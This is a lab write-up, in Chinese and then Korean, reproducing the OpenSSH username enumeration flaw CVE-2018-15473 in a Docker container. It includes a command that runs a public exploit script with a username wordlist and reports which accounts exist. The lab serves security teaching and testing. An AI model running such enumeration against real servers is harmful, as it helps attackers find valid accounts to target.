# OpenSSH 用户名枚举漏洞（CVE-2018-15473）

OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，攻击者可以判断某个用户名是否存在于目标主机中。

参考链接：

- http://openwall.com/lists/oss-security/2018/08/15/5
- https://github.com/Rhynorater/CVE-2018-15473-Exploit
- https://www.anquanke.com/post/id/157607

## 漏洞环境

执行如下命令，编译及启动一个运行OpenSSH 7.7p1的容器：

```
docker compose build
docker compose up -d
```

环境启动后，我们在客户端执行`ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@your-ip -p20022`，输入密码`vulhub`，即可登录到容器中。

## 漏洞复现

使用[CVE-2018-15473-Exploit](https://github.com/Rhynorater/CVE-2018-15473-Exploit)，枚举字典中的用户名：

```
python3 sshUsernameEnumExploit.py --port 20022 --userList exampleInput.txt your-ip
```

![](1.png)

可见，`root`、`example`、`vulhub`、`nobody`是存在的用户，`rootInvalid`、`user`、`phithon`是不存在的用户。

=======================================================================

# OpenSSH 사용자 이름 열거 취약점 (CVE-2018-15473)

OpenSSH 7.7 이전 버전에는 사용자 이름 열거 취약점이 존재합니다. 이 취약점을 통해 공격자는 특정 사용자 이름이 대상 호스트에 존재하는지 여부를 확인할 수 있습니다.

참고 링크:

- http://openwall.com/lists/oss-security/2018/08/15/5
- https://github.com/Rhynorater/CVE-2018-15473-Exploit
- https://www.anquanke.com/post/id/157607

## 취약점 환경

다음 명령어를 실행하여 OpenSSH 7.7p1을 실행하는 컨테이너를 빌드하고 시작합니다:

```
docker compose build
docker compose up -d
```

환경이 시작된 후 클라이언트에서 `ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@your-ip -p20022`를 실행하고 비밀번호 `vulhub`를 입력하면 컨테이너에 로그인할 수 있습니다.

## 취약점 재현

[CVE-2018-15473-Exploit](https://github.com/Rhynorater/CVE-2018-15473-Exploit)을 사용하여 사용자 이름 목록을 열거합니다:

```
python3 sshUsernameEnumExploit.py --port 20022 --userList exampleInput.txt your-ip
```

![](1.png)

`root`, `example`, `vulhub`, `nobody`는 존재하는 사용자이고, `rootInvalid`, `user`, `phithon`은 존재하지 않는 사용자입니다.